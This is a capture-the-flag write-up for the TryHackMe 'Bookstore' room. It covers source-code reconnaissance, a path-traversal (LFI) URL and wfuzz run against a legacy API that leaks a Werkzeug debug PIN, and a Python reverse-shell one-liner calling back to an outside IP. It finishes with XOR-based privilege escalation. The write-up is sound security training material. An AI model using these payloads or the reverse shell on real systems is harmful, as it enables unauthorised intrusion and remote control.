# Bookstore Writeup
*You can find the CTF on [Tryhackme](https://tryhackme.com/room/bookstoreoc)*

## Requirements
+ Always run your tools inside a virtual machine. Kali Linux (or similar) is a good starting point because it comes preloaded with many security tools, but **any Linux distro** in a VM is fine as long as you install what you need. Try not to use the Hackbox and setup your own env!
+ Before reading this writeup, please read the [README](../README.md), because what you are looking for might not be here.

## The Writeup

### Information gathering and exploit

<details>
  <summary>Hint 1</summary>

  Ctrl+U is your superpower
</details>
<details>
  <summary>Hint 2</summary>

  Old API versions never die, they just try to hide
</details>
<details>
  <summary>Hint 3</summary>

  The .bash_history file is every sysadmin's secret diary
</details>

<details>
  <summary>Solution</summary>

  As I like to do in every box, the first step is to avoid copying and pasting the IP address all the time by giving it a name.

  ```bash
        export TARGET="10.80.149.68"
  ```
  When we open the target in our browser, we're greeted by a static website that doesn't appear particularly useful. However, before using automated tools, let's `examine the HTML source code` for additional information.

  While reviewing the HTML, I found an interesting path worth exploring:

  ```html
        <script src="assets/js/jquery.min.js"></script>
  ```

  Additionally, on the `login page`, there's a revealing comment at the bottom:

  ```html
        <script src="more_css/js/main.js"></script>
        <!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
  ```
  This is valuable information, apparently there's a user called `sid` who stores a PIN inside their bash history file. This will likely be useful later.

  Exploring the *assets/js/* path, I found another interesting detail in *api.js*:

  ```js
        str = str + ":5000"
        return str;
        ...
        async function getUsers() {
            var u=getAPIURL();
            let url = 'http://' + u + '/api/v2/resources/books/random4';
        ...
        }
        renderUsers();
        //the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
  ```
  This is significant, there's an API endpoint on port 5000, and the old version (presumably v1) is vulnerable to `Local File Inclusion (LFI)`. Let's investigate.

  When accessing *http://$TARGET:5000/api*, we're presented with helpful documentation:

  ```
    Since every good API has a documentation we have one as well!
    The various routes this API currently provides are:

    /api/v2/resources/books/all (Retrieve all books and get the output in a json format)

    /api/v2/resources/books/random4 (Retrieve 4 random records)

    /api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

    /api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

    /api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

    /api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
   ```
   Testing the API with the id parameter confirms it works:

   ```json
    [
    {
        "author": "Ann Leckie ", 
        "first_sentence": "The body lay naked and facedown, a deathly gray, spatters of blood staining the snow around it.", 
        "id": "1", 
        "published": 2014, 
        "title": "Ancillary Justice"
    }
    ]
   ```

   Since we know v2 is secure against LFI, let's test if `v1` is still running:
   
   *http://$TARGET:5000/api/v1/resources/books?id=1*

   ```json
    [
    {
        "author": "Ann Leckie ", 
        "first_sentence": "The body lay naked and facedown, a deathly gray, spatters of blood staining the snow around it.", 
        "id": "1", 
        "published": 2014, 
        "title": "Ancillary Justice"
    }
    ]
   ```
   Success! We get the same result, confirming that v1 is still active. Now let's attempt LFI to read sid's `bash history`:

   *http://$TARGET:5000/api/v1/resources/books?id=../../../../../../../home/sid/.bash_history

   Unfortunately, this returns an empty response. However, we know LFI is possible, so we need to find the correct parameter. I'll use wfuzz to identify it:

   ```bash
    ┌──(kali㉿)-[~]
    └─$ wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 "http://$TARGET:5000/api/v1/resources/books?FUZZ=../../../../../../../home/sid/.bash_history"

    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************

    Target: http://$TARGET:5000/api/v1/resources/books?FUZZ=../../../../../../../home/sid/.bash_history
    Total requests: 220560

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload
    =====================================================================

    000000395:   200        7 L      11 W       116 Ch      "show"
    000000486:   200        1 L      1 W        3 Ch        "author"
    000000529:   200        1 L      1 W        3 Ch        "id"
   ```
   Excellent! The `show` parameter reveals useful information:

   ```
   cd /home/sid whoami export WERKZEUG_DEBUG_PIN=REDACTED echo $WERKZEUG_DEBUG_PIN python3 /home/sid/api.py ls exit
   ```

   We now have a PIN, but we need to determine its purpose. Let's enumerate the website further to see if we missed anything.

   During enumeration, we discover a console page at `/console` that wasn't linked from the main page. This debugging console requests the PIN we just found. Once authenticated, we have access to a Python interpreter that we can leverage for a reverse shell.

   Using [RevShells](https://www.revshells.com/), I selected a Python reverse shell payload:
   
   ```python
   import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.177.1",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
   ```

   After establishing the reverse shell, we're logged in as sid and can retrieve the `flag`:

   ```bash
    $ cd /home/sid
    cd /home/sid
    $ ls
    ls
    api.py  api-up.sh  books.db  try-harder  user.txt
    $ cat user.txt
   ```


</details>

### Privilage escalation

<details>
  <summary>Hint 1</summary>

  If a binary asks for a "magic number," it's probably not actually magic, just download it and let Ghidra do the wizard work.
</details>

<details>
  <summary>Solution</summary>

  As always, upgrade the shell first to make it fully interactive:
  ```bash
  $ python3 -c 'import pty; pty.spawn("/bin/bash")'
    python3 -c 'import pty; pty.spawn("/bin/bash")'
  sid@bookstore:~$
  ```

  After getting a shell as `sid`, an interesting file immediately stands out: `try-harder`.

  ```bash
  sid@bookstore:~$ ./try-harder
  What's The Magic Number?!
  17
  Incorrect Try Harder
  ```
  To analyze it properly, download the binary to the local machine and reverse it (Ghidra makes this quick).


  ![1](/Bookstore/screenshots/1.png)

  In Ghidra, the `main()` logic is straightforward: it asks for a number, performs a couple of XOR operations, and spawns a privileged shell only if the check passes

  ```c
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  ```
  To retrieve the correct input, use the reversibility of XOR

  ```c
  local_1c = 0x5dcd21f4 ^ 0x1116 ^ 0x5db3 = REDACTED
  ```
  now we can solve our riddle and get our root flag!
  ```bash
  sid@bookstore:~$ ./try-harder
  ./try-harder
  What's The Magic Number?!
  REDACTED
  root@bookstore:~# cat /root/root.txt
  ```

</details>